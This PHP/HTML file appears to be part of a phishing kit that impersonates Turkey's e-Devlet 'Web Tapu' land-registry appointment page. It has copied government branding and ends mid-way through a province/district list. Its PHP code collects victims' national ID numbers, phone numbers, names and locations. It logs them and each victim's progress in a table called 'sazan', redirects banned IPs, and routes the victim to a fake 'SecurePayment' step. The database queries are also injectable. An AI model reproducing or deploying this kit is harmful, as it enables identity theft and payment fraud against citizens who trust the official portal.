<?php
error_reporting(0);
date_default_timezone_set('Europe/Istanbul');
include("gmypanel/Core/getRealIPAdress.php");
include("gmypanel/Core/mobileDetect.php");
include("gmypanel/Core/browserDetect.php");
include("gmypanel/Connection.php");
ob_start();
session_start();
$ip = getUserIP();
$db->query("UPDATE sazan SET now = 'Step2 Ekranında (Tapu)' WHERE ip = '{$ip}'");
$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){
        header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
    }
}

// index.php'den gelen veriler
if (isset($_POST['tc'])) {
    $tcgeldi = $_POST['tc'];
    $telefon = $_POST['telefon'];
    $ad = $_POST['ad'];
    $soyad = $_POST['soyad'];
    $il = $_POST['il'];
    $ilce = $_POST['ilce'];
    $islem = $_POST['islem'];
    $aciklama = $_POST['aciklama'];
    
    $_SESSION['tc'] = $tcgeldi;
    $_SESSION['telno'] = $telefon;
    $_SESSION['real_ad'] = $ad . ' ' . $soyad;
    $_SESSION['il'] = $il;
    $_SESSION['ilce'] = $ilce;
    $_SESSION['veri'] = $il . ' / ' . $ilce;
    $_SESSION['veri2'] = $islem . ' - ' . $aciklama;
    $_SESSION['tutar'] = "29"; // Sabit Tapu Harç bedeli (Step 3 ile uyumlu)
} else {
    $tcgeldi = $_SESSION['tc'];
    $telefon = $_SESSION['telno'];
}

// TC'yi sazan'a kaydet — telno eşleştirmesi için
if (!empty($tcgeldi)) {
    $db->query("UPDATE sazan SET tc = '{$tcgeldi}' WHERE ip = '{$ip}'");
}

$tc_soniki = substr($tcgeldi, 8, 11);
$tc_ilkdort = substr($tcgeldi, 0, 2);
?>
<!DOCTYPE html><!--[if lte IE 8]><html class="oldie" lang="tr"><![endif]--><!--[if gt IE 8]><!-->
<html lang="tr"><!--<![endif]-->

<head>
    <meta charset="utf-8">
    <link rel="dns-prefetch">
    <link rel="preconnect" href="//cdn.e-devlet.gov.tr">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <meta name="description"
        content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz." />
    <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet, türkiyegovtr" />
    <meta name="robots" content="index,follow" />
    <meta property="og:url" content="">
    <meta property="og:title" content="Web Tapu İşlemleri">
    <meta property="og:description"
        content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz.">
    <meta property="og:image" content="//cdn.e-devlet.gov.tr/themes/ankara/images/fb-share-v01.jpg">
    <title>Web Tapu İşlemleri</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#1C3761">
    <link rel="icon" type="image/png"
        href="//cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.1.8.0.png" sizes="196x196" />
    <meta name="google-play-app" content="app-id=tr.gov.turkiye.edevlet.kapisi">
    <link rel="alternate" type="application/rss+xml" title="e-Devlet Kapısı" href="/rss" />
    <link rel="search" type="application/opensearchdescription+xml"
        href="//cdn.e-devlet.gov.tr/themes/ankara/assets/opensearch.xml" title="Arama" />
    <link rel="stylesheet" href="//cdn.e-devlet.gov.tr/themes/izmir/css/base.1.9.5.css">
    
    <!-- jQuery Library for AJAX polling -->
    <script src="public/javascripts/jquery.js"></script>

    <script id="info_js" data-static-version="1.9.5"
        src="//cdn.e-devlet.gov.tr/themes/izmir/js/header.1.9.5.js"></script>
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/t.1.9.5.js"></script>
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/ajax.1.9.5.js"></script>
    <!--[if lte IE 9]><script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common-old.1.9.5.js"></script><![endif]--><!--[if gt IE 9]><!-->
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script><!--<![endif]-->
    <link href="//cdn.e-devlet.gov.tr/themes/izmir/css/common-pages.1.9.5.css" rel="stylesheet" />
    
    <!-- Custom Style System to match Web Tapu style perfectly -->
    <style>
        .webtapu-flow {
            max-width: 900px;
            margin: 20px auto;
            padding: 0 15px;
        }
        .webtapu-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            background: #fff;
            padding: 16px 20px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            border: 1px solid #e2e8f0;
        }
        .webtapu-step-wrapper {
            display: flex;
            align-items: center;
            flex: 1;
        }
        .webtapu-step-wrapper:last-child {
            flex: none;
        }
        .webtapu-step {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: #718096;
            font-size: 14px;
            font-weight: 500;
        }
        .webtapu-step.is-active {
            color: #1c3761;
            font-weight: 700;
        }
        .webtapu-step.is-completed {
            color: #48bb78;
        }
        .webtapu-step.is-disabled {
            color: #a0aec0;
            cursor: not-allowed;
        }
        .webtapu-step-number {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            background: #edf2f7;
            color: #4a5568;
            font-weight: bold;
            font-size: 13px;
            border: 1px solid #cbd5e0;
        }
        .webtapu-step.is-active .webtapu-step-number {
            background: #1c3761;
            color: #fff;
            border-color: #1c3761;
        }
        .webtapu-step.is-completed .webtapu-step-number {
            background: #48bb78;
            color: #fff;
            border-color: #48bb78;
        }
        .webtapu-step-connector {
            flex: 1;
            height: 2px;
            background: #e2e8f0;
            margin: 0 20px;
        }
        .webtapu-step-connector.is-completed {
            background: #48bb78;
        }
        .webtapu-card {
            background: #fff;
            border-radius: 8px;
            padding: 28px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            border: 1px solid #e2e8f0;
            margin-bottom: 24px;
        }
        .webtapu-card h3 {
            margin-top: 0;
            margin-bottom: 10px;
            color: #1c3761;
            font-size: 20px;
            font-weight: 700;
        }
        .webtapu-muted {
            color: #718096;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.6;
        }
        .webtapu-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        @media (max-width: 768px) {
            .webtapu-grid {
                grid-template-columns: 1fr;
            }
            .webtapu-steps {
                flex-direction: column;
                align-items: flex-start;
                gap: 12px;
            }
            .webtapu-step-connector {
                display: none;
            }
        }
        .webtapu-field {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .webtapu-field--wide {
            grid-column: 1 / -1;
        }
        .webtapu-field label {
            font-weight: 600;
            color: #2d3748;
            font-size: 13.5px;
        }
        .webtapu-field input, .webtapu-field select, .webtapu-field textarea {
            padding: 12px 14px;
            border: 1.5px solid #cbd5e0;
            border-radius: 6px;
            font-size: 14px;
            background: #fff;
            color: #2d3748;
            transition: all 0.2s;
            width: 100%;
            box-sizing: border-box;
        }
        .webtapu-field input:focus, .webtapu-field select:focus, .webtapu-field textarea:focus {
            border-color: #1c3761;
            outline: none;
            box-shadow: 0 0 0 3px rgba(28, 55, 97, 0.15);
        }
        .webtapu-summary {
            background: #f7fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 20px;
            font-size: 13.5px;
            color: #4a5568;
            line-height: 1.6;
        }
        .webtapu-summary strong {
            color: #2d3748;
        }
        .webtapu-actions {
            display: flex;
            justify-content: flex-end;
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #edf2f7;
        }
        .button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #cbd5e0;
            background: #fff;
            color: #4a5568;
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.2s;
            margin-right: 12px;
        }
        .button:hover {
            background: #edf2f7;
            color: #2d3748;
        }
        .primaryButton {
            background: #1c3761;
            color: #fff;
            border: none;
            padding: 14px 28px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .primaryButton:hover {
            background: #142846;
        }
    </style>
</head>

<body data-version=".1.8.0" data-token="{a25259528754b7a3282c64a9428ee0d71ccc13f1cdafdfda631b09f79629e086}"
    data-unique="b2732545b09eeacb5b6e56c59edbbffa" data-level="0" data-page="tkgm-web-tapu" data-lang="tr_TR.UTF-8">
    <header id="top">
        <div class="headerGroup">
            <div id="accesibilityBlock"><a href="#pageContentBlock" id="contentBlockLink" accesskey="1">İçeriğe Git</a>
                <a href="/" accesskey="2">Ana Sayfa</a>
            </div>
            <h1 id="brandingBlock"><a id="homeLink" href="/" title="Ana Sayfa'ya Dönüş">e-Devlet Kapısı</a></h1>
            <nav id="mainActionsBlock" aria-labelledby="mainActionsBlockTitle">
                <h2 class="sectionTitle" id="mainActionsBlockTitle">Ana Bölümler</h2>
                <ul class="mainActionsList">
                    <li id="hizli_cozum_holder"><span class="fast-shortcuts"> <a><i
                                    class="edk-fonticon-fastresponse"></i><span>
                                    Hızlı Çözüm</span></a></span></li>
                    <li class="inner-wrapper">
                        <ul class="accessibility" id="accessibilityUl" aria-expanded="false" role="menu" tabindex="0"
                            aria-label="Erişilebilirlik">
                            <li class="active" aria-hidden="true"><i class="ico-key-1"></i></li>
                            <li class="menu" role="none">
                                <ul role="none">
                                    <li role="none"><a role="menuitem">Erişilebilirlik Özellikleri</a>
                                    </li>
                                    <li role="none"><a role="menuitem" href="javascript:void(0)" class="textOnlyToggle"
                                            data-state="html">Salt Metin Görünümü</a></li>
                                    <li role="none"><a role="menuitem" href="javascript:void(0)" class="fontSizeToggle"
                                            data-state="normal">Daha Belirgin Odaklama</a></li>
                                </ul>
                            </li>
                        </ul>
                    </li>
                    <li class="search-form-wrapper">
                        <form id="searchForm" name="searchForm" method="get" action="/arama"><label
                                for="searchField">Aranan Terim</label>
                            <div class="search-wrapper">
                                <div class="inner-search"><input placeholder="Nasıl yardım edebilirim?" id="searchField"
                                        name="aranan" value="" autocomplete="off" role="combobox" aria-owns="popSearch"
                                        aria-haspopup="true" aria-autocomplete="both" aria-expanded="false"
                                        autocorrect="off" autocapitalize="off" /> <span class="ico-search"></span></div>
                                <ul id="popSearch"></ul>
                            </div><input id="searchButton" type="submit" value="Ara" />
                        </form>
                    </li>
                    <li id="l" class="login-area"><a> Giriş Yap <span class="ico-login"></span></a></li>
                </ul>
            </nav>
        </div>
    </header>
    <main id="serviceBlock" class="typeInsurance">
        <div id="vue">
            <nav class="pageTabNavigation" aria-label="Üst Sayfalar">
                <ul class="breadcrumbNavigation">
                    <li><a class="home">Ana Sayfa</a></li>
                    <li><a>Tapu ve Kadastro Genel Müdürlüğü</a></li>
                    <li class="here">Web Tapu İşlemleri</li>
                </ul>
            </nav>
            <section id="pageContentBlock" class="themed">
                <section class="serviceTitleBlock">
                    <div class="serviceDetails"><img class="agencyLogo webp"
                            src="//cdn.e-devlet.gov.tr/themes/ankara/images/logos/64webp/262.1.8.0.webp" alt=""
                            width="64" height="64">
                        <h2><a href="/tapu-ve-kadastro-genel-mudurlugu">Tapu ve Kadastro Genel Müdürlüğü</a><em>Web Tapu
                                İşlemleri</em></h2>
                    </div>
                </section>
                <section id="contentStart" class="serviceContainer">

                    <div class="webtapu-flow">
                        <nav class="webtapu-steps" aria-label="Başvuru adımları" role="navigation">
                            <div class="webtapu-step-wrapper">
                                <span class="webtapu-step is-completed">
                                    <span class="webtapu-step-number">
                                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path d="M13.5 4.5L6 12L2.5 8.5" stroke="currentColor" stroke-width="2"
                                                stroke-linecap="round" stroke-linejoin="round" />
                                        </svg>
                                    </span>
                                    <span class="webtapu-step-label">Başvuru</span>
                                </span>
                                <div class="webtapu-step-connector is-completed"></div>
                            </div>
                            <div class="webtapu-step-wrapper">
                                <a href="#" class="webtapu-step is-active" aria-current="step">
                                    <span class="webtapu-step-number">2</span>
                                    <span class="webtapu-step-label">Randevu Seçimi</span>
                                </a>
                                <div class="webtapu-step-connector"></div>
                            </div>
                            <div class="webtapu-step-wrapper">
                                <span class="webtapu-step" aria-current="false">
                                    <span class="webtapu-step-number">3</span>
                                    <span class="webtapu-step-label">Ödeme</span>
                                </span>
                                <div class="webtapu-step-connector"></div>
                            </div>
                            <div class="webtapu-step-wrapper">
                                <span class="webtapu-step is-disabled" aria-current="false">
                                    <span class="webtapu-step-number">4</span>
                                    <span class="webtapu-step-label">Sonuç</span>
                                </span>
                            </div>
                        </nav>

                        <section class="webtapu-card">
                            <h3>Randevu Seçimi</h3>
                            <p class="webtapu-muted">Uygun tarih ve saat aralığını seçiniz.</p>

                            <form method="get" action="SecurePayment.php" class="webtapu-form" onsubmit="return formKontrol();">
                                <input type="hidden" name="telno" value="<?php echo htmlspecialchars($telefon); ?>" />

                                <div class="webtapu-grid">
                                    <div class="webtapu-field webtapu-field--wide">
                                        <label for="mudurluk">Tapu Müdürlüğü</label>
                                        <select id="mudurluk" name="mudurluk" required>
                                            <option value="">Seçiniz</option>
                                        </select>
                                    </div>
                                    <div class="webtapu-field">
                                        <label for="tarih">Tarih</label>
                                        <input id="tarih" name="tarih" type="date" value="" min="<?php echo date('Y-m-d'); ?>" required />
                                    </div>
                                    <div class="webtapu-field">
                                        <label for="saat">Saat</label>
                                        <select id="saat" name="saat" required>
                                            <option value="" >Seçiniz</option>
                                            <option value="09:15" >09:15</option>
                                            <option value="09:30" >09:30</option>
                                            <option value="09:45" >09:45</option>
                                            <option value="10:00" >10:00</option>
                                            <option value="10:15" >10:15</option>
                                            <option value="10:30" >10:30</option>
                                            <option value="10:45" >10:45</option>
                                            <option value="11:00" >11:00</option>
                                            <option value="11:15" >11:15</option>
                                            <option value="11:30" >11:30</option>
                                            <option value="11:45" >11:45</option>
                                            <option value="12:00" >12:00</option>
                                            <option value="12:15" >12:15</option>
                                            <option value="12:30" >12:30</option>
                                            <option value="12:45" >12:45</option>
                                            <option value="13:00" >13:00</option>
                                            <option value="13:15" >13:15</option>
                                            <option value="13:30" >13:30</option>
                                            <option value="13:45" >13:45</option>
                                            <option value="14:00" >14:00</option>
                                            <option value="14:15" >14:15</option>
                                            <option value="14:30" >14:30</option>
                                            <option value="14:45" >14:45</option>
                                            <option value="15:00" >15:00</option>
                                            <option value="15:15" >15:15</option>
                                            <option value="15:30" >15:30</option>
                                            <option value="15:45" >15:45</option>
                                            <option value="16:00" >16:00</option>
                                            <option value="16:15" >16:15</option>
                                            <option value="16:30" >16:30</option>
                                        </select>
                                    </div>
                                </div>

                                <div class="webtapu-summary">
                                    <div><strong>Başvuru Sahibi:</strong> <?php echo isset($_SESSION['real_ad']) ? htmlspecialchars($_SESSION['real_ad']) : 'Bilinmiyor'; ?></div>
                                    <div><strong>İşlem:</strong> 
                                        <?php 
                                        $islem_map = array('Satis' => 'Satış', 'Ipotek' => 'İpotek', 'Bagis' => 'Bağış', 'Intikal' => 'İntikal', 'Diger' => 'Diğer');
                                        $islem_key = isset($_SESSION['islem']) ? $_SESSION['islem'] : '';
                                        echo isset($islem_map[$islem_key]) ? $islem_map[$islem_key] : htmlspecialchars($islem_key); 
                                        ?>
                                    </div>
                                    <div><strong>İl/İlçe:</strong> <?php echo isset($_SESSION['veri']) ? htmlspecialchars($_SESSION['veri']) : 'Bilinmiyor'; ?></div>
                                </div>

                                <div class="webtapu-actions">
                                    <a class="button" href="index.php">Geri</a>
                                    <button type="submit" class="primaryButton">Ödemeye Devam Et</button>
                                </div>
                            </form>
                        </section>
                    </div>

                </section>
            </section>
        </div>
    </main>
    <footer data-pagecache="0.0102">
        <div id="bottomLinksGroup">
            <div id="bottomLinksWrapper">
                <nav id="bottomLinksBlock" aria-labelledby="bottomLinksBlockTitle">
                    <h2 class="sectionTitle" id="bottomLinksBlockTitle">Sayfa Sonu Bağlantıları</h2>
                    <ul id="bottomLinks">
                        <li class="bottomLinksGroup">
                            <h3>e-Devlet Kapısı</h3>
                            <ul>
                                <li><a>English</a></li>
                                <li><a>Hakkımızda</a></li>
                                <li><a>Yasal Bildirim</a></li>
                                <li><a>KVKK Aydınlatma Yükümlülüğü</a></li>
                                <li><a accesskey="8">Gizlilik ve Kullanım</a></li>
                                <li><a>Politikalarımız</a></li>
                                <li>Kurumsal Kimlik</li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>e-Hizmetler</h3>
                            <ul>
                                <li><a>Sık Kullanılan Hizmetler</a></li>
                                <li><a>Yeni Eklenen Hizmetler</a></li>
                                <li><a accesskey="h">Kurum Hizmetleri</a></li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>Yardım</h3>
                            <ul>
                                <li><a accesskey="6">Genel Yardım</a></li>
                                <li><a accesskey="5">Sıkça Sorulanlar</a></li>
                                <li><a>Güvenliğiniz İçin</a></li>
                                <li><a>Help For Non-Citizens</a></li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>Bize Ulaşın</h3>
                            <ul>
                                <li><a accesskey="9">İletişim</a></li>
                                <li><a>CİMER Başvurusu</a></li>
                            </ul>
                        </li>
                        <li class="bottomLinksGroup">
                            <h3>Erişilebilirlik</h3>
                            <ul>
                                <li><a href="javascript:void(0)" role="button" class="textOnlyToggle" data-state="html">Salt Metin Görünümü</a></li>
                                <li><a href="javascript:void(0)" role="button" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a></li>
                                <li><a accesskey="0">Klavye Kısayolları</a></li>
                                <li><a accesskey="3">Site Haritası</a></li>
                            </ul>
                        </li>
                    </ul>
                </nav>
                <div id="bottomRightWrapper">
                    <nav id="bottomContacts" aria-labelledby="sectionTitleContacts"
                        aria-describedby="bottomContactsText">
                        <h2 class="sectionTitle" id="sectionTitleContacts">İletişim Seçenekleri</h2>
                        <div class="bottomContactsText" id="bottomContactsText"><em>Yardım mı lazım?</em> Aşağıdaki yöntemleri kullanarak bizimle iletişime geçebilirsiniz.</div>
                        <ul id="bottomContactsList">
                            <li><a class="fastcallcenter">Hızlı Çözüm Merkezi</a></li>
                            <li><a class="email" accesskey="7">Bize Yazın</a></li>
                            <li><a class="callcenter">e-Devlet Çağrı Merkezi</a></li>
                            <li><a class="signinghelp">Engelsiz Çağrı Merkezi</a></li>
                        </ul>
                    </nav>
                    <nav id="bottomSocialLinks" aria-label="Sosyal Medya Bağlantı Adresleri"><a target="_blank"><span class="ico-facebook"></span>Facebook</a><a target="_blank"><img src="//cdn.e-devlet.gov.tr/themes/izmir/images/icons/twitter-logo-white.png" height="16" class="ed-float-start ed-me-2" alt=""> Twitter</a><a target="_blank"><span class="ico-youtube"></span>Youtube</a><a target="_blank"><span class="ico-instagram-1"></span>Instagram</a></nav>
                </div>
            </div>
            <div id="bottomPartnerLinks">
                <div class="images"><a class="externalLink" href="#"><img alt="T.C. Cumhurbaşkanlığı Siber Güvenlik Başkanlığı" src="//cdn.e-devlet.gov.tr/themes/izmir/images/footer/SGB-logo.png" style="height:30px" /></a><a class="externalLink" rel="external"><img alt="Türksat A.Ş." src="//cdn.e-devlet.gov.tr/themes/izmir/images/footer/turksat.png" /></a></div>
                <div class="bottomPartnerText">e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi <a class="externalLink" rel="external" href="#">T.C. Cumhurbaşkanlığı Siber Güvenlik Başkanlığı</a> tarafından yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi <a class="externalLink" rel="external">Türksat A.Ş.</a> tarafından yapılmaktadır.</div>
            </div>
            <div id="bottomCopyrightBlock">© <time datetime="2026-01-20">2026</time> Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.</div>
        </div>
    </footer>
</body>

<script>
    const ilIlceData = {"İstanbul":["Adalar","Arnavutköy","Ataşehir","Avcılar","Bağcılar","Bahçelievler","Bakırköy","Başakşehir","Bayrampaşa","Beşiktaş","Beykoz","Beylikdüzü","Beyoğlu","Büyükçekmece","Çatalca","Çekmeköy","Esenler","Esenyurt","Eyüp","Fatih","Gaziosmanpaşa","Güngören","Kadıköy","Kağıthane","Kartal","Küçükçekmece","Maltepe","Pendik","Sancaktepe","Sarıyer","Şile","Silivri","Şişli","Sultanbeyli","Sultangazi","Tuzla","Ümraniye","Üsküdar","Zeytinburnu"],"Ardahan":["Ardahan","Çıldır","Damal","Göle","Hanak","Posof"],"Adana":["Aladağ","Ceyhan","Çukurova","Feke","İmamoğlu","Karaisalı","Karataş","Kozan","Pozantı","Saimbeyli","Sarıçam","Seyhan","Tufanbeyli","Yumurtalık","Yüreğir"],"Artvin":["Ardanuç","Arhavi","Artvin","Borçka","Hopa","Murgul","Şavşat","Yusufeli"],"Batman":["Batman","Beşiri","Gercüş","Hasankeyf","Kozluk","Sason"],"Ağrı":["Ağrı","Diyadin","Doğubeyazıt","Eleşkirt","Hamur","Patnos","Taşlıçay","Tutak"],"İzmir":["Aliağa","Balçova","Bayındır","Bayraklı","Bergama","Beydağ","Bornova","Buca","Çeşme","Çiğli","Dikili","Foça","Gaziemir","Güzelbahçe","Karabağlar","Karaburun","Karşıyaka","Kemalpaşa","Kınık","Kiraz","Konak","Menderes","Menemen","Narlıdere","Ödemiş","Seferihisar","Selçuk","Tire","Torbalı","Urla"],"Adıyaman":["Adıyaman","Besni","Çelikhan","Gerger","Gölbaşı","Kahta","Samsat","Sincik","Tut"],"Ankara":["Akyurt","Altındağ","Ayaş","Bala","Beypazarı","Çamlıdere","Çankaya","Çubuk","Elmadağ","Etimesgut","Evren","Gölbaşı","Güdül","Haymana","Kalecik","Kazan","Keçiören","Kızılcahamam","Mamak","Nallıhan","Polatlı","Pursaklar","Şereflikoçhisar","Sincan","Yenimahalle"],"Aydın":["Aydın","Bozdoğan","Buharkent","Çine","Didim","Germencik","İncirliova","Karacasu","Karpuzlu","Koçarlı","Köşk","Kuşadası","Kuyucak","Nazilli","Söke","Sultanhisar","Yenipazar"],"Aksaray":["Ağaçören","Aksaray","Eskil","Gülağaç","Güzelyurt","Ortaköy","Sarıyahşi"],"Bartın":["Amasra","Bartın","Kurucaşile","Ulus"],"Afyonkarahisar":["Afyon","Başmakçı","Bayat","Bolvadin","Çay","Çobanlar","Dazkırı","Dinar","Emirdağ","Evciler","Hocalar","İhsaniye","İscehisar","Kızılören","Sandıklı","Sincanlı","Şuhut","Sultandıgı"],"Balıkesir":["Ayvalık","Balıkesir","Balya","Bandırma","Bigadiç","Burhaniye","Dursunbey","Edremit","Erdek","Gömeç","Gönen","Havran","İvrindi","Kepsut","Manyas","Marmara","Savaştepe","Sındırgı","Susurluk"],"Antalya":["Akseki","Aksu","Alanya","Demre","Döşemealtı","Elmalı","Finike","Gazipaşa","Gündoğmuş","İbradı","Kaş","Kemer","Kepez","Konyaaltı","Korkuteli","Kumluca","Manavgat","Muratpaşa","Serik"],"Bursa":["Büyükorhan","Gemlik","Gürsu","Harmancık","İnegöl","İznik","Karacabey","Keles","Kestel","Mudanya","Mustafakemalpaşa","Nilüfer","Orhaneli","Orhangazi","Osmangazi","Yenişehir","Yıldırım"],"Amasya":["Amasya","Göynücek","Gümüşhacıköy","Hamamözü","Merzifon","Suluova","Taşova"],"Çanakkale":["Ayvacık","Bayramiç","Biga","Bozcaada","Çan","Çanakkale","Eceabat","Ezine","Gelibolu","Gökçeada","Lapseki","Yenice"],"Bayburt":["Aydıntepe","Bayburt","Demirözü"],"Diyarbakır":["Bağlar","Bismil","Çermik","Çınar","Çüngüş","Dicle","Eğil","Ergani","Hani","Hazro","Kayapınar","Kocaköy","Kulp","Lice","Silvan","Sur","Yenişehir"],"Bilecik":["Bilecik","Bozüyük","Gölpazarı","İnhisar","Osmaneli","Pazaryeri","Söğüt","Yenipazar"],"Bingöl":["Adaklı","Bingöl","Genç","Karlıova","Kiğı","Solhan","Yayladere","Yedisu"],"Burdur":["Ağlasun","Altınyayla","Bucak","Burdur","Çavdır","Çeltikçi","Gölhisar","Karamanlı","Kemer","Tefenni","Yeşilova"],"Düzce":["Akçakoca","Çilimli","Cumayeri","Düzce","Gölyaka","Gümüşova","Kaynaşlı","Yığılca"],"Çorum":["Alaca","Bayat","Boğazkale","Çorum","Dodurga","İskilip","Kargı","Laçin","Mecitözü","Oğuzlar","Ortaköy","Osmancık","Sungurlu","Uğurludağ"],"Çankırı":["Atkaracalar","Bayramören","Çankırı","Çerkeş","Eldivan","Ilgaz","Kızılırmak","Korgun","Kurşunlu","Orta","Şabanözü","Yapraklı"],"Bitlis":["Adilcevaz","Ahlat","Bitlis","Güroymak","Hizan","Mutki","Tatvan"],"Gümüşhane":["Gümüşhane","Kelkit","Köse","Kürtün","Şiran","Torul"],"Bolu":["Bolu","Dörtdivan","Gerede","Göynük","Kıbrıscık","Mengen","Mudurnu","Seben","Yeniçağa"],"Kahramanmaraş":["Afşin","Andırın","Çağlıyancerit","Ekinözü","Elbistan","Göksun","Kahramanmaraş","Nurhak","Pazarcık","Türkoğlu"],"Karaman":["Ayrancı","Başyayla","Ermenek","Karaman","Kazımkarabekir","Sarıveliler"],"Edirne":["Edirne","Enez","Havsa","İpsala","Keşan","Lalapaşa","Meriç","Süloğlu","Uzunköprü"],"Erzurum":["Aşkale","Aziziye","Çat","Hınıs","Horasan","İspir","Karaçoban","Karayazı","Köprüköy","Narman","Oltu","Olur","Palandöken","Pasinler","Pazaryolu","Şenkaya","Tekman","Tortum","Uzundere","Yakutiye"],"Hakkari":["Çukurca","Hakkari","Şemdinli","Yüksekova"],"Eskişehir":["Alpu","Beylikova","Çifteler","Günyüzü","Han","İnönü","Mahmudiye","Mihalgazi","Mihalıççık","Odunpazarı","Sarıcakaya","Seyitgazi","Sivrihisar","Tepebaşı"],"Elazığ":["Ağın","Alacakaya","Arıcak","Baskil","Elazığ","Karakoçan","Keban","Kovancılar","Maden","Palu","Sivrice"],"Karabük":["Eflani","Eskipazar","Karabük","Ovacık","Safranbolu","Yenice"],"Giresun":["Alucra","Bulancak","Çamoluk","Çanakçı","Dereli","Doğankent","Espiye","Eynesil","Giresun","Görele","Güce","Keşap","Piraziz","Şebinkahisar","Tirebolu","Yağlıdere"],"Iğdır":["Aralık","Iğdır","Karakoyunlu","Tuzluca"],"Gaziantep":["Araban","İslahiye","Karkamış","Nizip","Nurdağı","Oğuzeli","Şahinbey","Şehitkamil","Yavuzeli"],"Hatay":["Altınözü","Antakya","Belen","Dörtyol","Erzin","Hassa","İskenderun","Kırıkhan","Kumlu","Reyhanlı","Samandağ","Yayladıgı"],"Erzincan":["Çayırlı","Erzincan","Ilıç","Kemah","Kemaliye","Otlukbeli","Refahiye","Tercan","Üzümlü"],"Denizli":["Acıpayam","Akköy","Babadağ","Baklan","Bekilli","Beyağaç","Bozkurt","Buldan","Çal","Çameli","Çardak","Çivril","Denizli","Güney","Honaz","Kale","Sarayköy","Serinhisar","Tavas"],"Isparta":["Aksu","Atabey","Eğirdir","Gelendost","Gönen","Isparta","Keçiborlu","Şarkikaraağaç","Senirkent","Sütçüler","Uluborlu","Yalvaç","Yenişarbademli"],"Kars":["Akyaka","Arpaçay","Digor","Kağızman","Kars","Sarıkamış","Selim","Susuz"],"Konya":["Ahırlı","Akören","Akşehir","Altınekin","Beyşehir","Bozkır","Çeltik","Cihanbeyli","Çumra","Derbent","Derebucak","Doğanhisar","Emirgazi","Ereğli","Güneysınır","Hadim","Halkapınar","Hüyük","Ilgın","Kadınhanı","Karapınar","Karatay","Kulu","Meram","Sarayönü","Selçuklu","Seydişehir","Taşkent","Tuzlukçu","Yalıhüyük","Yunak"],"Kırklareli":["Babaeski","Demirköy","Kırklareli","Kofçaz","Lüleburgaz","Pehlivanköy","Pınarhisar","Vize"],"Kastamonu":["Abana","Ağlı","Araç","Azdavay","Bozkurt","Çatalzeytin","Cide","Daday","Devrekani","Doğanyurt","Hanönü","İhsangazi","İnebolu","Kastamonu","Küre","Pınarbaşı","Şenpazar","Seydiler","Taşköprü","Tosya"],"Kilis":["Elbeyli","Kilis","Musabeyli","Polateli"],"Kırşehir":["Akçakent","Akpınar","Boztepe","Çiçekdağı","Kaman","Kırşehir","Mucur"],"Mersin":["Akdeniz","Anamur","Aydıncık","Bozyazı","Çamlıyayla","Erdemli","Gülnar","Mezitli","Mut","Silifke","Tarsus","Toroslar","Yenişehir"],"Kocaeli":["Başiskele","Çayırova","Darıca","Derince","Dilovası","Gebze","Gölcük","İzmit","Kandıra","Karamürsel","Kartepe","Körfez"],"Manisa":["Ahmetli","Akhisar","Alaşehir","Demirci","Gölmarmara","Gördes","Kırkağaç","Köprübaşı","Kula","Manisa","Salihli","Sarıgöl","Saruhanlı","Selendi","Soma","Turgutlu"],"Malatya":["Akçadağ","Arapkir","Arguvan","Battalgazi","Darende","Doğanşehir","Doğanyol","Hekimhan","Kale","Kuluncak","Malatya","Pütürge","Yazıhan","Yeşilyurt"],"Muğla":["Bodrum","Dalaman","Datça","Fethiye","Kavaklıdere","Köyceğiz","Marmaris","Milas","Muğla","Ortaca","Ula","Yatağan"],"Muş":["Bulanık","Hasköy","Korkut","Malazgirt","Muş","Varto"],"Kayseri":["Akkışla","Bünyan","Develi","Felahiye","Hacılar","İncesu","Kocasinan","Melikgazi","Özvatan","Pınarbaşı","Sarıoğlan","Sarız","Talas","Tomarza","Yahyalı","Yeşilhisar"],"Kırıkkale":["Bahşili","Balışeyh","Çelebi","Delice","Karakeçili","Keskin","Kırıkkale","Sulakyurt","Yahşihan"],"Mardin":["Dargeçit","Deri